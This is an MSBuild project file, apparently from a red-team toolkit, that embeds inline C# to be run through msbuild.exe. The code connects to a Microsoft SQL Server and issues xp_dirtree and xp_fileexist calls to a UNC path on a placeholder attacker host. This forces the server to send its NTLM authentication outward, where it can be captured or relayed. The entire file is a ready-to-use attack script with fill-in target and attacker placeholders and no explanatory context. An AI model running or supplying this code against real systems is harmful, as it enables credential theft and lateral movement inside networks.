<!-- C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe ntlm-evasion-mssql-1.csproj -->

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <Target Name="Hello">
        <ClassExample />
    </Target>
    <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
        <Task>
            <Reference Include="System.Data.dll" />
            <Code Type="Class" Language="cs">
                <![CDATA[
                    using System;
                    using System.Runtime.InteropServices;
                    using System.Reflection;
                    using Microsoft.Build.Framework;
                    using Microsoft.Build.Utilities;
                                    
                    public class ClassExample :  Task, ITask
                    {
                        public override bool Execute()
                        {
                            String sqlServer = "VAR_TARGET_HOST";
                            String database = "master";
                            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                            System.Data.SqlClient.SqlCommand command;
                            System.Data.SqlClient.SqlDataReader reader;

                            System.Data.SqlClient.SqlConnection con = new System.Data.SqlClient.SqlConnection(conString);
                            try
                            {
                                con.Open();
                            }
                            catch
                            {
                                Console.WriteLine("Auth failed");
                                Environment.Exit(0);
                            }

                            string[] uncChecks = {
                                "EXEC master..xp_dirtree '\\\\{0}\\check';",
                                "EXEC master..xp_fileexist '\\\\{0}\\check';",
                            };

                            foreach (string check in uncChecks)
                            {
                                command = new System.Data.SqlClient.SqlCommand(String.Format(check, "VAR_ATTACKER_HOST"), con);
                                reader = command.ExecuteReader();
                                while (reader.Read())
                                {
                                    Console.WriteLine(String.Format("{0}, {1}", reader[0], reader[1]));
                                }
                                reader.Close();
                            }
                            con.Close();
                            return true;
                        }
                    }
                ]]>
            </Code>
        </Task>
    </UsingTask>
</Project>